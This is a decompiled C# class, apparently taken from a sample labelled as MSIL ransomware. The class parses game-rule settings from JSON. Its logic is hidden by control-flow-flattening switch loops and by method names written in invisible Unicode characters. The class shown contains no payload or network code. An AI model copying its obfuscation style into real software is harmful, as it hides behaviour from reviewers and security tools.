// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: ModuleBuild, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 89F10113-88CA-4804-9B17-4A5288FD99D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2e269df5f1ed94bc3f07c434a6d33a1e48ce04fd0feb953bba71e2a8ced82875.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 2052346740;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 785703571)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1405147901 ^ -305454120;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * -1844661591 ^ 1776171417;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = 104368311;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 580680538)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1596691249 ^ 2042616617;
            continue;
          case 1:
            int asInt = json["max-impact"].AsInt;
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 574531590 ^ -2089978652;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
label_1:
      int num1 = -116752970;
      int aIndex;
      bool flag;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -111450616)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            aIndex = 0;
            num1 = (int) num2 * 990428295 ^ -1160201004;
            continue;
          case 3:
            riskChances = numArray;
            num1 = (int) num2 * -254409174 ^ -380470500;
            continue;
          case 4:
            int num3 = !flag ? 8390294 : (num3 = 132609522);
            num1 = num3 ^ (int) num2 * 1980315420;
            continue;
          case 5:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = -638044985;
            continue;
          case 6:
            num1 = (int) num2 * 412865225 ^ -1507298626;
            continue;
          case 7:
            ++aIndex;
            num1 = (int) num2 * -1143207875 ^ -1913290701;
            continue;
          case 8:
            flag = aIndex < numArray.Length;
            num1 = -639113324;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
label_1:
      int num1 = -1857851151;
      int num2;
      List<Card> cardList;
      int aIndex1;
      bool flag1;
      int aIndex2;
      JSONNode jsonNode;
      bool flag2;
      bool flag3;
      Card[] array;
      bool flag4;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -929243782)) % 26U)
        {
          case 0:
            flag4 = aIndex1 < maxImpact * 2;
            num1 = -1224328886;
            continue;
          case 1:
            flag3 = aIndex2 < count;
            num1 = -1843818721;
            continue;
          case 2:
            num1 = -1058504158;
            continue;
          case 3:
            num1 = (int) num3 * -444084384 ^ 2003551665;
            continue;
          case 4:
            flag2 = num2 < jsonNode[aIndex1].AsInt;
            num1 = -1349259339;
            continue;
          case 5:
            ++aIndex2;
            num1 = (int) num3 * 111455931 ^ -1291510372;
            continue;
          case 6:
            array = cardList.ToArray();
            num1 = (int) num3 * 2014866444 ^ -252098156;
            continue;
          case 8:
            num2 = 0;
            num1 = (int) num3 * 1058117626 ^ -48160423;
            continue;
          case 9:
            flag1 = aIndex1 < maxImpact;
            num1 = -821598937;
            continue;
          case 10:
            goto label_1;
          case 11:
            cardList.Add(new Card()
            {
              Impact = flag1 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = -1333432744;
            continue;
          case 12:
            jsonNode = json[aIndex2];
            aIndex1 = 0;
            num1 = (int) num3 * -1520184843 ^ 1022556904;
            continue;
          case 13:
            num1 = (int) num3 * -875352435 ^ 1724940015;
            continue;
          case 14:
            aIndex2 = 0;
            num1 = (int) num3 * -70284252 ^ -298722899;
            continue;
          case 15:
            int num4 = !flag3 ? 1384549501 : (num4 = 1161213593);
            num1 = num4 ^ (int) num3 * 342458355;
            continue;
          case 16:
            num1 = (int) num3 * 1802974933 ^ -2108547651;
            continue;
          case 17:
            ++aIndex1;
            num1 = (int) num3 * 1660547007 ^ 1513455909;
            continue;
          case 18:
            num1 = (int) num3 * -146539756 ^ 675159597;
            continue;
          case 19:
            num1 = -2037295968;
            continue;
          case 20:
            num1 = (int) num3 * -1161885663 ^ 2124760514;
            continue;
          case 21:
            num1 = (int) num3 * -574201322 ^ -289435009;
            continue;
          case 22:
            ++num2;
            num1 = (int) num3 * -269504261 ^ 1507578826;
            continue;
          case 23:
            cardList = new List<Card>();
            num1 = (int) num3 * 1782572569 ^ 305929681;
            continue;
          case 24:
            int num5 = flag4 ? 597705241 : (num5 = 948542049);
            num1 = num5 ^ (int) num3 * -1972311896;
            continue;
          case 25:
            int num6 = !flag2 ? -1550575562 : (num6 = -1789092145);
            num1 = num6 ^ (int) num3 * -29373968;
            continue;
          default:
            goto label_27;
        }
      }
label_27:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = 809775849;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 336759348)) % 4U)
        {
          case 1:
            str = Rules.\u206C​​‏‌‏‎‎‏⁬⁭‍‎​‏‌​⁫‫‮‎⁯‮⁮‌⁫‭‪‍‏‭‏⁫⁭⁯‮​‮‍⁫‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -697752460 ^ 1832098007;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1642051738 ^ -1490385686;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = -159527228;
      Card[] cards;
      int index;
      Card card1;
      int num2;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -312738932)) % 17U)
        {
          case 1:
            int num4 = flag ? -1951393547 : (num4 = -2018283176);
            num1 = num4 ^ (int) num3 * -6117840;
            continue;
          case 2:
            card1 = cards[index];
            num1 = -1520789737;
            continue;
          case 3:
            str1 = "[\n\t";
            num1 = (int) num3 * -1042472658 ^ -1823377378;
            continue;
          case 4:
            int num5;
            num1 = num5 = index >= cards.Length ? -1751962677 : (num5 = -12132421);
            continue;
          case 5:
            cards = this.Cards;
            num1 = (int) num3 * -1433482930 ^ 1619099756;
            continue;
          case 6:
            str2 = Rules.\u200C‪‏‪⁭​‭⁪‫⁬‮⁫‭‭‬‫⁫‎⁭‏⁮‬‮⁭‬‬‮‭‫⁭‪⁯‭‫‮​⁪​​‫‮(str1, "\n]");
            num1 = (int) num3 * 964943926 ^ 999124495;
            continue;
          case 7:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u202C‏‮‮⁫‭‫⁮⁪⁪‫⁫⁫⁬‪⁪‏‭⁫⁯⁭⁭⁪‫‭‍⁫⁪⁬‌‌‫⁮⁮‌⁬‫‏⁫‏‮((object) card2) : (string) null;
            str1 = Rules.\u202C‭‭‫‬‎⁮⁬⁪⁬‬‍⁬⁯⁭⁭‍⁮‎‭⁪‏⁫‮‭‫‏​⁮‏⁭⁭‫‍⁬​⁫‪‎‌‮(str3, str4, " ");
            num1 = -2121586725;
            continue;
          case 8:
            num1 = (int) num3 * -989261792 ^ -897431674;
            continue;
          case 9:
            ++index;
            num1 = (int) num3 * 1293194949 ^ -1842464230;
            continue;
          case 10:
            goto label_1;
          case 11:
            num1 = (int) num3 * -1521360524 ^ 43744108;
            continue;
          case 12:
            num1 = (int) num3 * 1767683565 ^ -571699690;
            continue;
          case 13:
            flag = num2 != card1.Type;
            num1 = (int) num3 * 205748803 ^ -1070517837;
            continue;
          case 14:
            index = 0;
            num1 = (int) num3 * -642599876 ^ 1965429189;
            continue;
          case 15:
            str1 = Rules.\u200C‪‏‪⁭​‭⁪‫⁬‮⁫‭‭‬‫⁫‎⁭‏⁮‬‮⁭‬‬‮‭‫⁭‪⁯‭‫‮​⁪​​‫‮(str1, "\n\t");
            num2 = card1.Type;
            num1 = (int) num3 * 952276809 ^ -1011847217;
            continue;
          case 16:
            num2 = 0;
            num1 = (int) num3 * -1477431270 ^ -1808588739;
            continue;
          default:
            goto label_18;
        }
      }
label_18:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = 2124203842;
      string str1;
      string str2;
      int index;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1513505726)) % 11U)
        {
          case 0:
            num1 = (int) num2 * 2143111373 ^ -1073242937;
            continue;
          case 1:
            num1 = (int) num2 * -1623019828 ^ -205417827;
            continue;
          case 2:
            str2 = Rules.\u200C‪‏‪⁭​‭⁪‫⁬‮⁫‭‭‬‫⁫‎⁭‏⁮‬‮⁭‬‬‮‭‫⁭‪⁯‭‫‮​⁪​​‫‮(str1, " ]");
            num1 = (int) num2 * 1177825532 ^ -588078841;
            continue;
          case 3:
            flag = index < this.RiskChances.Length;
            num1 = 568424768;
            continue;
          case 4:
            str1 = Rules.\u200C‪‏‪⁭​‭⁪‫⁬‮⁫‭‭‬‫⁫‎⁭‏⁮‬‮⁭‬‬‮‭‫⁭‪⁯‭‫‮​⁪​​‫‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u200E‏⁫‫⁮​‎​​⁬‭⁫‍⁫⁫⁫‏⁬‌‭​⁭‪⁪​⁭​‮‮‮‪⁭⁭‪‬‮‮​‫‏‮()));
            num1 = (int) num2 * -1011046347 ^ 1482840780;
            continue;
          case 6:
            ++index;
            num1 = (int) num2 * -807106930 ^ -1897829753;
            continue;
          case 7:
            str1 = Rules.\u202C‭‭‫‬‎⁮⁬⁪⁬‬‍⁬⁯⁭⁭‍⁮‎‭⁪‏⁫‮‭‫‏​⁮‏⁭⁭‫‍⁬​⁫‪‎‌‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u200E‏⁫‫⁮​‎​​⁬‭⁫‍⁫⁫⁫‏⁬‌‭​⁭‪⁪​⁭​‮‮‮‪⁭⁭‪‬‮‮​‫‏‮()));
            num1 = 2122287841;
            continue;
          case 8:
            int num3 = !flag ? -599331109 : (num3 = -564819080);
            num1 = num3 ^ (int) num2 * 2128280137;
            continue;
          case 9:
            goto label_1;
          case 10:
            index = 1;
            num1 = (int) num2 * 1570055736 ^ -1623569920;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    static string \u206C​​‏‌‏‎‎‏⁬⁭‍‎​‏‌​⁫‫‮‎⁯‮⁮‌⁫‭‪‍‏‭‏⁫⁭⁯‮​‮‍⁫‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200C‪‏‪⁭​‭⁪‫⁬‮⁫‭‭‬‫⁫‎⁭‏⁮‬‮⁭‬‬‮‭‫⁭‪⁯‭‫‮​⁪​​‫‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202C‏‮‮⁫‭‫⁮⁪⁪‫⁫⁫⁬‪⁪‏‭⁫⁯⁭⁭⁪‫‭‍⁫⁪⁬‌‌‫⁮⁮‌⁬‫‏⁫‏‮([In] object obj0) => obj0.ToString();

    static string \u202C‭‭‫‬‎⁮⁬⁪⁬‬‍⁬⁯⁭⁭‍⁮‎‭⁪‏⁫‮‭‫‏​⁮‏⁭⁭‫‍⁬​⁫‪‎‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u200E‏⁫‫⁮​‎​​⁬‭⁫‍⁫⁫⁫‏⁬‌‭​⁭‪⁪​⁭​‮‮‮‪⁭⁭‪‬‮‮​‫‏‮() => CultureInfo.InvariantCulture;
  }
}
